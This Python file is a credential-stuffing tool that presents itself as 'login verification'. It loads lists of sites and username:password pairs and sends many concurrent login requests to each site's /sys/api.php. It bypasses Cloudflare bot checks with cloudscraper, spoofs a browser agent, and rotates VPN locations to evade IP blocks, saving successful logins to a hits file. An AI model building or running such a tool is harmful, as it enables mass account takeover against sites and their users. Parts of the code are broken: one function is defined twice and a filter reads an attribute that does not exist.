import logging
import os
from dataclasses import dataclass, field
from typing import List, Optional, Set, Dict
from datetime import datetime
import requests
from requests.exceptions import RequestException
import time
from pathlib import Path
import concurrent.futures
import threading
from urllib3.exceptions import InsecureRequestWarning
import warnings
from enum import Enum
from abc import ABC, abstractmethod
from collections import defaultdict
import cloudscraper
import subprocess

# Suppress SSL warnings more elegantly
warnings.filterwarnings('ignore', category=InsecureRequestWarning)

class LoggerSetup:
    """Centralized logging configuration"""
    @staticmethod
    def setup():
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('app.log'),
                logging.StreamHandler()
            ]
        )
        logging.getLogger('urllib3').setLevel(logging.ERROR)
        return logging.getLogger(__name__)

logger = LoggerSetup.setup()

class LoginStatus(Enum):
    """Enumeration of possible login states"""
    SUCCESS = "success"
    INVALID_CREDENTIALS = "invalid_credentials"
    CONNECTION_ERROR = "connection_error"
    UNKNOWN_ERROR = "unknown_error"

@dataclass
class Config:
    """Application configuration with type hints and validation"""
    max_workers: int = 20
    request_timeout: int = 15
    retry_delay: int = 2
    max_retries: int = 3
    verify_ssl: bool = False
    delay_between_requests: float = 1.0
    max_consecutive_errors: int = 3
    reconnect_delay: int = 30
    session_renewal_time: int = 300
    max_site_errors: int = 5 # New: maximum errors before removing a site
    error_reset_time: int = 300 # New: time in seconds before resetting error count
    
    def __post_init__(self):
        """Validate configuration values"""
        if self.max_workers < 1:
            raise ValueError("max_workers must be positive")
        if self.request_timeout < 1:
            raise ValueError("request_timeout must be positive")
        if self.retry_delay < 0:
            raise ValueError("retry_delay cannot be negative")

@dataclass
class Credentials:
    """Login credentials"""
    username: str
    password: str
    
    def __post_init__(self):
        if not self.username or not self.password:
            raise ValueError("Username and password cannot be empty")

class DataLoader(ABC):
    """Abstract base class for data loaders"""
    @abstractmethod
    def load(self, path: Path) -> List:
        pass
    
    def _validate_file(self, path: Path) -> None:
        """Validate that file exists and is not empty"""
        if not path.exists():
            raise FileNotFoundError(f"File not found: {path}")
        if path.stat().st_size == 0:
            raise ValueError(f"File is empty: {path}")

class SiteLoader(DataLoader):
    """Load and validate site URLs from a file"""
    def load(self, path: Path) -> List[str]:
        self._validate_file(path)
        sites = []
        
        with open(path, 'r') as f:
            for line in f:
                site = line.strip()
                if site and not site.startswith('#'):
                    # Basic URL validation
                    if '.' in site and len(site) > 3:
                        sites.append(site)
                    else:
                        logger.warning(f"Invalid site format: {site}")
        
        if not sites:
            logger.warning("No valid sites found in file")
        else:
            logger.info(f"Loaded {len(sites)} sites")
        
        return sites

class CredentialsLoader(DataLoader):
    """Load and validate credentials from a file"""
    def load(self, path: Path) -> List[Credentials]:
        self._validate_file(path)
        credentials = []
        
        with open(path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    try:
                        username, password = line.split(':')
                        if username and password:
                            credentials.append(Credentials(username.strip(), password.strip()))
                        else:
                            logger.warning(f"Invalid credential format: {line}")
                    except ValueError:
                        logger.warning(f"Invalid credential line format: {line}")
        
        if not credentials:
            logger.warning("No valid credentials found in file")
        else:
            logger.info(f"Loaded {len(credentials)} credential pairs")
        
        return credentials

@dataclass
class LoginResult:
    """Login attempt result with enhanced status tracking"""
    status: LoginStatus
    site: str
    credentials: Credentials
    session_id: Optional[str] = None
    credits: Optional[str] = None
    error_message: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)
    
    @property
    def success(self) -> bool:
        return self.status == LoginStatus.SUCCESS
    
    @property
    def is_error(self) -> bool:
        return self.status in [LoginStatus.CONNECTION_ERROR, LoginStatus.UNKNOWN_ERROR]

class SiteErrorTracker:
    """Track errors per site with time-based reset"""
    def __init__(self, max_errors: int, error_reset_time: int):
        self.max_errors = max_errors
        self.error_reset_time = error_reset_time
        self._error_counts: Dict[str, int] = defaultdict(int)
        self._last_error_time: Dict[str, datetime] = {}
        self._removed_sites: Set[str] = set()
        self._lock = threading.Lock()
    
    def add_error(self, site: str) -> bool:
        """
        Add an error for a site and return True if site should be removed
        """
        with self._lock:
            current_time = datetime.now()
            
            # Check if we should reset error count
            if site in self._last_error_time:
                time_diff = (current_time - self._last_error_time[site]).seconds
                if time_diff > self.error_reset_time:
                    self._error_counts[site] = 0
            
            self._error_counts[site] += 1
            self._last_error_time[site] = current_time
            
            if self._error_counts[site] >= self.max_errors:
                self._removed_sites.add(site)
                return True
        
        return False
    
    def is_site_removed(self, site: str) -> bool:
        """Check if a site has been removed due to errors"""
        with self._lock:
            return site in self._removed_sites
    
    def get_removed_sites(self) -> Set[str]:
        """Get all removed sites"""
        with self._lock:
            return self._removed_sites.copy()
class ResultManager:
    """Thread-safe result management with site error tracking"""
    def __init__(self, config: Config):
        self._results: List[LoginResult] = []
        self._results_lock = threading.Lock()
        self._success_combinations: Set[tuple] = set()
        self._combinations_lock = threading.Lock()
        self._consecutive_errors = 0
        self._errors_lock = threading.Lock()
        self.error_tracker = SiteErrorTracker(config.max_site_errors, config.error_reset_time)
    
    def add_result(self, result: LoginResult) -> bool:
        """
        Add a result and return True if the site should be removed from testing
        """
        with self._results_lock:
            self._results.append(result)
            
            if result.success:
                with self._combinations_lock:
                    self._success_combinations.add(
                        (result.credentials.username, result.credentials.password)
                    )
                self.reset_errors()
                self._save_result(result)
                return False
            
            if result.is_error:
                remove_site = self.error_tracker.add_error(result.site)
                if remove_site:
                    logger.warning(f"Site {result.site} removed due to excessive errors")
                return remove_site
        
        return False
    
    def increment_errors(self) -> None:
        with self._errors_lock:
            self._consecutive_errors += 1
    
    def reset_errors(self) -> None:
        with self._errors_lock:
            self._consecutive_errors = 0
    
    @property
    def consecutive_errors(self) -> int:
        with self._errors_lock:
            return self._consecutive_errors
    
    def _save_result(self, result: LoginResult) -> None:
        """Save successful login result to hits.txt"""
        with open("data/results/hits.txt", "a") as f:
            f.write(f"{result.timestamp} - {result.site} - {result.credentials.username}:{result.credentials.password}\n")

class LoginClient:
    """HTTP client for login operations with session management"""
    def __init__(self, config: Config):
        self.config = config
        self._session = None
        self._session_created = None
        self._create_session()
    
    def _create_session(self) -> None:
        """Create a new session with security headers"""
        self._session = cloudscraper.create_scraper()
        self._session.verify = self.config.verify_ssl
        self._session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        })
        self._session_created = datetime.now()

    def _check_session_renewal(self) -> None:
        """Renew session if expired"""
        if (datetime.now() - self._session_created).seconds > self.config.session_renewal_time:
            self._create_session()
            logger.info("Session renewed")

    def login(self, site: str, credentials: Credentials) -> LoginResult:
        """Attempt login with retry logic"""
        self._check_session_renewal()
        url = f"https://{site}/sys/api.php"
        for attempt in range(self.config.max_retries):
            try:
                response = self._session.post(
                    url,
                    data={
                        "action": "login",
                        "username": credentials.username,
                        "password": credentials.password
                    },
                    timeout=self.config.request_timeout
                )
                
                if response.ok and "success\":true" in response.text:
                    return LoginResult(
                        status=LoginStatus.SUCCESS,
                        site=site,
                        credentials=credentials,
                        session_id=response.cookies.get("PHPSESSID")
                    )
                
                return LoginResult(
                    status=LoginStatus.INVALID_CREDENTIALS,
                    site=site,
                    credentials=credentials,
                    error_message="Invalid credentials"
                )
            except RequestException as e:
                logger.warning(f"Connection error on attempt {attempt + 1}: {str(e)}")
                if attempt < self.config.max_retries - 1:
                    time.sleep(self.config.retry_delay * (2 ** attempt))
                    continue
                
                return LoginResult(
                    status=LoginStatus.CONNECTION_ERROR,
                    site=site,
                    credentials=credentials,
                    error_message=f"Connection error after {self.config.max_retries} attempts"
                )
            except Exception as e:
                logger.error(f"Unexpected error: {str(e)}")
                return LoginResult(
                    status=LoginStatus.UNKNOWN_ERROR,
                    site=site,
                    credentials=credentials,
                    error_message=str(e)
                )
            finally:
                time.sleep(self.config.delay_between_requests)

class LoginManager:
    """Orchestrate the login verification process"""
    def __init__(self, config: Config):
        self.config = config
        self.result_manager = ResultManager(config)
        self._progress_lock = threading.Lock()
        self.total_attempts = 0
        self.completed_attempts = 0
        self.running = True
        self.last_activity = time.time()
        self._active_sites_lock = threading.Lock()
        self._active_sites: Set[str] = set()

    def _remove_site(self, site: str) -> None:
        """Remove a site from active testing"""
        with self._active_sites_lock:
            if site in self._active_sites:
                self._active_sites.remove(site)
                logger.info(f"Removed site from testing: {site}")
                self._update_total_attempts()

    def _update_total_attempts(self) -> None:
        """Update total attempts based on remaining sites"""
        with self._active_sites_lock:
            self.total_attempts = len(self._active_sites) * len(self._credentials)

    def _worker(self, site: str, credentials: Credentials) -> None:
        """Worker function for processing a single login attempt"""
        if not self.running or self.result_manager.error_tracker.is_site_removed(site):
            return
        client = LoginClient(self.config)
        
        try:
            if self.result_manager.consecutive_errors >= self.config.max_consecutive_errors:
                logger.warning(f"Too many consecutive errors. Waiting {self.config.reconnect_delay}s...")
                time.sleep(self.config.reconnect_delay)
                self.result_manager.reset_errors()
            result = client.login(site, credentials)
            if self.result_manager.add_result(result):
                self._remove_site(site)
            self._update_progress()
        except Exception as e:
            logger.error(f"Worker error: {str(e)}")
        finally:
            with self._progress_lock:
                self.completed_attempts += 1
                self.last_activity = time.time()

    def _update_progress(self) -> None:
        """Update and display progress"""
        with self._progress_lock:
            if self.total_attempts > 0:
                progress = (self.completed_attempts / self.total_attempts) * 100
                logger.info(f"Progress: {progress:.1f}% ({self.completed_attempts}/{self.total_attempts})")
                logger.info(f"Active sites: {len(self._active_sites)}")

    def process_sites(self, sites: List[str], credentials: List[Credentials]) -> None:
        """Process all sites and credentials concurrently"""
        self._credentials = credentials # Store for total_attempts calculation
        self._active_sites = set(sites)
        self.total_attempts = len(sites) * len(credentials)
        self.completed_attempts = 0
        start_time = time.time()
        logger.info(f"Starting verification of {len(sites)} sites with {len(credentials)} credentials")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.max_workers) as executor:
            futures = set()
            
            # Submit initial batch of tasks
            for site in sites:
                if self.running and not self.result_manager.error_tracker.is_site_removed(site):
                    for cred in credentials:
                        futures.add(executor.submit(self._worker, site, cred))
            
            # Process results and handle site removals
            while futures:
                done, futures = concurrent.futures.wait(
                    futures,
                    timeout=1.0,
                    return_when=concurrent.futures.FIRST_COMPLETED
                )
                
                # Process completed futures
                for future in done:
                    try:
                        future.result()
                    except Exception as e:
                        logger.error(f"Task error: {str(e)}")
                
                # Remove tasks for problematic sites
                futures = {f for f in futures 
                           if not self.result_manager.error_tracker.is_site_removed(f.site)}
        
        duration = time.time() - start_time
        removed_sites = self.result_manager.error_tracker.get_removed_sites()
        
        logger.info(f"Verification completed in {duration:.1f} seconds")
        if removed_sites:
            logger.info(f"Sites removed due to errors: {len(removed_sites)}")
            for site in removed_sites:
                logger.info(f" - {site}")

def connect_vpn(location):
    """Connect to a Windscribe VPN server."""
    try:
        subprocess.run(["windscribe", "connect", location], check=True)
        logger.info(f"Connected to {location}")
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to connect to {location}: {e}")

def disconnect_vpn():
    """Disconnect from the Windscribe VPN."""
    try:
        subprocess.run(["windscribe", "disconnect"], check=True)
        logger.info("Disconnected from VPN")
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to disconnect: {e}")

def rotate_vpn(locations, delay=60):
    """Rotate through VPN locations."""
def rotate_vpn(locations, delay=60):
    """Rotate through VPN locations."""
    for location in locations:
        disconnect_vpn()
        connect_vpn(location)
        time.sleep(delay)

def main():
    """Main execution function"""
    try:
        config = Config()
        base_path = Path("data")
        sites_path = base_path / "sites.txt"
        credentials_path = base_path / "credentials.txt"
        results_path = base_path / "results"
        
        # Create directories if they don't exist
        results_path.mkdir(parents=True, exist_ok=True)
        
        # Load data files
        sites = SiteLoader().load(sites_path)
        credentials = CredentialsLoader().load(credentials_path)
        
        if not sites or not credentials:
            logger.error("No sites or credentials loaded. Exiting.")
            return
        
        # Start VPN rotation
        vpn_locations = ["US", "CA", "UK", "FR", "DE"]  # Add more locations as needed
        vpn_thread = threading.Thread(target=rotate_vpn, args=(vpn_locations, 300))
        vpn_thread.start()
        
        # Start login process
        login_manager = LoginManager(config)
        login_manager.process_sites(sites, credentials)
    
    except Exception as e:
        logger.error(f"Application error: {str(e)}")
        raise

if __name__ == "__main__":
    main()
